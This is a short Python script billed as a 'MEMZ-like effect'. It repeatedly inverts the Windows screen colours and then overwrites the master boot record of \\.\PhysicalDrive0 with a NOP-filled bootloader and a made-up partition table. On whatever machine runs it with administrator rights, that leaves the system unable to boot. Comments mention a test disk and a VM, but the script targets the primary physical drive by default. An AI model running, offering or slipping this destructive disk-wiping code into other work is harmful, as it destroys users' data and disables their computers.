import time
import ctypes
import win32gui
import win32api
import win32con
import os

def create_mbr():
    mbr = bytearray(512)  # 512 bytes for the MBR
    mbr[:446] = b'\x90' * 446  # Fill bootloader with NOP (0x90)
    partition_table = [
        b'\x80\x00\x02\x00\x07\xFE\xFF\xFF\x00\x08\x00\x00\x00\x00\x00\x80',  # Partition 1
        b'\x00' * 16,  # Empty Partition 2
        b'\x00' * 16,  # Empty Partition 3
        b'\x00' * 16   # Empty Partition 4
    ]
    mbr[446:510] = b''.join(partition_table)
    mbr[510:512] = b'\x55\xAA'  # Boot signature
    return mbr

def write_mbr(drive_path):
    mbr = create_mbr()
    try:
        with open(drive_path, 'wb') as drive:
            drive.write(mbr)
        print(f"Successfully wrote MBR to {drive_path}")
    except PermissionError:
        print("Permission denied. Run the script as Administrator.")
    except FileNotFoundError:
        print(f"Drive {drive_path} not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

def invert_screen():
    hdc = win32gui.GetDC(0)  # Get device context for the whole screen
    screen_width = win32api.GetSystemMetrics(0)
    screen_height = win32api.GetSystemMetrics(1)

    print("Inverting screen colors for 20 seconds...")
    duration = 20  # Total effect duration in seconds
    interval = 1   # Time between inversions in seconds
    iterations = duration // interval

    for _ in range(iterations):  # Repeat the effect
        # Invert screen
        win32gui.BitBlt(hdc, 0, 0, screen_width, screen_height, hdc, 0, 0, win32con.NOTSRCCOPY)
        time.sleep(interval)  # Pause between inversions

    win32gui.ReleaseDC(0, hdc)  # Release device context
    print("Screen inversion effect completed.")

def main():
    print("Running MEMZ-like effect...")
    invert_screen()  # Run the inverting effect

    time.sleep(2)  # Small delay before writing the MBR

    print("Overwriting the MBR...")
    target_drive = r'\\.\PhysicalDrive0'  # Change this to your test disk
    write_mbr(target_drive)

    print("MBR modification completed. Reboot the VM to observe the effect.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Script interrupted.")
    except Exception as e:
        print(f"An error occurred: {e}")

